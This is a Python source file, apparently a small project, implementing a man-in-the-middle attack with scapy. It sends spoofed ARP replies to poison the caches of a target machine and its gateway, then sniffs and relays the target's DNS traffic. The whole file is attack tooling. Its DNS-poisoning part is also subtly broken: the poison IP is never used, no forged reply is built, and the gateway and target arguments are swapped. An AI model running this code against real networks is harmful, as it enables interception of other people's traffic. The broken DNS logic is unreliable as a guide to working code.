"""
MITM DNS Poisoning script

Developed by:
- Hiro
- Hiram
"""

from scapy.all import *
from collections import deque
import threading
import time
import sys

"""
Poisons gateway's and client's ARP tables, so packets are redirected the
attacker machine.
"""

class ARPPoisonThread(threading.Thread):

    def __init__(   self,\
                    targetip,\
                    gatewayip,\
                    name='arpoison'
                    ):
        """ constructor, setting initial variables """
        self._stopevent = threading.Event(  )
        self._sleepperiod = 1.0

        threading.Thread.__init__(self, name=name)

        self.targetip = targetip
        self.gatewayip = gatewayip

    def _getmac(self, targetip):
        arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
        targetmac = srp(arppacket)[0][0][1].hwsrc
        return targetmac

    def _poisonarpcache(self, targetip, targetmac, sourceip):
        spoofed = ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
        send(spoofed)

    def _restorearp(self, targetip, targetmac, sourceip, sourcemac):
        packet = ARP(   op=2,\
                        hwsrc=sourcemac,\
                        psrc= sourceip,\
                        hwdst= targetmac,\
                        pdst= targetip)
        send(packet)
        print ("ARP Table restored to normal for", targetip)

    def run(self):
        try:
            self.targetmac = self._getmac(self.targetip)
        except:
            print("Target machine did not respond to ARP broadcast")
            quit()

        try:
            self.gatewaymac= self._getmac(self.gatewayip)
        except:
            print("Gateway is unreachable")
            quit()

        print ("Sending spoofed ARP replies")
        while True:
            time.sleep(5)
            self._poisonarpcache(self.targetip, self.targetmac, self.gatewayip)
            self._poisonarpcache(self.gatewayip, self.gatewaymac, self.targetip)

    def join(self, timeout=None):
        print ("ARP spoofing stopped")
        self._restorearp(   self.gatewayip,\
                            self.gatewaymac,\
                            self.targetip,\
                            self.targetmac)

        self._restorearp(   self.targetip,\
                            self.targetmac,\
                            self.gatewayip,\
                            self.gatewaymac)

        threading.Thread.join(self, timeout)

class DNSPoisonThread(threading.Thread):

    def __init__(   self,\
                    site,\
                    targetip,\
                    name='dnspoison'):
        """ constructor, setting initial variables """

        threading.Thread.__init__(self, name=name)
        self.site = site
        self.targetip = targetip

    def _analysis(self, packet):
        #Performs checks, whether DNS response contains our gold or not.

        if packet[Ether].dst == '28:56:5a:49:ff:67' and packet[Ether].src == 'b4:2e:99:f4:b7:df':
           packet[Ether].dst = 'c4:e9:84:9a:14:16'
           packet[Ether].src = '28:56:5a:49:ff:67'
           packet[IP].ttl = 255

        if packet[Ether].dst == '28:56:5a:49:ff:67' and packet[Ether].src == 'c4:e9:84:9a:14:16':
           packet[Ether].dst = 'b4:2e:99:f4:b7:df'
           packet[Ether].src = '28:56:5a:49:ff:67'
           packet[IP].ttl = 255

        if self.site in packet[DNSQR].qname.decode('UTF-8'):
            packet.show()

        sendp(packet)

    def run(self):
        #Only do packet sniffing
        sniff(  filter=f'host {self.targetip} and udp port 53',\
                prn=self._analysis)

    def join(self, timeout=None):
        threading.Thread.join(self, timeout)

import argparse

def args():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('gatewayip', metavar='G', help='IP address of the gateway')
    arg_parser.add_argument('targetip', metavar='T', help='IP address of the target')
    arg_parser.add_argument('site', metavar='S', help='Domain to be spoofed')
    arg_parser.add_argument('poisonip', metavar='P', help='New IP for the domain')

    args = arg_parser.parse_args()

    return args

def main(args):
    targetip = args.gatewayip
    gatewayip = args.targetip
    site = args.site
    poisonip = args.poisonip

    print(f"Will spoof {targetip} of gateway {gatewayip} for site {site} as {poisonip}")

    try:
        arp_poison = ARPPoisonThread(targetip, gatewayip)
        dns_poison = DNSPoisonThread(site, targetip)

        arp_poison.start()
        time.sleep(5)
        dns_poison.start()

        while True:
            time.sleep(.1)

    except KeyboardInterrupt:
        arp_poison.join()
        dns_poison.join()

if __name__ == "__main__":
    main(args())

